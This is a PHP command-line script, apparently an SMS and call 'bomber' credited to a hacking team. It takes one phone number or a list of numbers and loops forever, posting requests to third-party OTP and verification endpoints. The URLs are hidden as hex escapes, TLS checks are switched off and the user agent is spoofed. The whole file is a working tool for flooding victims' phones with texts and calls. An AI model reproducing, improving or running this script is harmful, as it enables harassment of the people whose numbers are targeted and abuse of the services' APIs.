#!/usr/bin/env php
<?php
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = "";
    $RR = "";
    $G  = "";
    $GG = "";
    $B  = "";
    $BB = "";
    $Y  = "";
    $YY = "";
    $X  = "";
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0';
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m";
    $ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';
    system('clear');
}
if(function_exists('pcntl_signal')) {
	declare(ticks = 1);
	function signal_handler($signal) {
		global $Y,$X;
		switch($signal) {
		case SIGTERM:
		die($Y."\n=========================== Cvar1984 ))=====(@)>".$X."\n");
		case SIGKILL:
		die($Y."\n=========================== Cvar1984 ))=====(@)>".$X."\n");
		case SIGINT:
		die($Y."\n=========================== Cvar1984 ))=====(@)>".$X."\n");
		}
	}
	pcntl_signal(SIGTERM, "signal_handler");
	pcntl_signal(SIGINT, "signal_handler");
}
function post_data($url,$data) {
	global $ua;
	$ch=curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}
echo $Y.
"
 _     _ _        ___ _____ ____  
| |   (_) |_ ___ / _ \_   _|  _ \ 
| |   | | __/ _ \ | | || | | |_) |
| |___| | ||  __/ |_| || | |  __/ 
|_____|_|\__\___|\___/ |_| |_|";
echo $R."\n++++++++++++++++++++++++++++++++++++++";
echo $B."\nAuthor  : Cvar1984                   ".$R.'+';
echo $B."\nGithub  : https://github.com/Cvar1984".$R.'+';
echo $B."\nTeam    : BlackHole Security         ".$R.'+';
echo $B."\nVersion : 2.4                        ".$R.'+';
echo $B."\nDate    : 13-03-2018                 ".$R.'+';
echo $R."\n++++++++++++++++++++++++++++++++++++++".$G.$X."\n\n";
isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
if(is_numeric($argv[1])) {
	echo "Calling     -> ".$G.$argv[1].$X."\n";
	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
	while(1) {
		echo "Send OTP To -> ".$G.$argv[1].$X."\n";	
		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);
	}
}
if(!file_exists($argv[1])) {
	die($RR."[!] File Not Exists [!]".$X."\n");
}
$argv[1]=explode("\n",file_get_contents($argv[1]));
$argv[1]=str_replace(' ','',$argv[1]);
foreach($argv[1] as $argv[2]):
echo "Calling     -> ".$G.$argv[2].$X."\n";
	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[2]."&accept=call");
endforeach;
while(1) {
foreach($argv[1] as $argv[2]):
echo "Send OTP To -> ".$G.$argv[2].$X."\n";
	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[2]);
endforeach;
}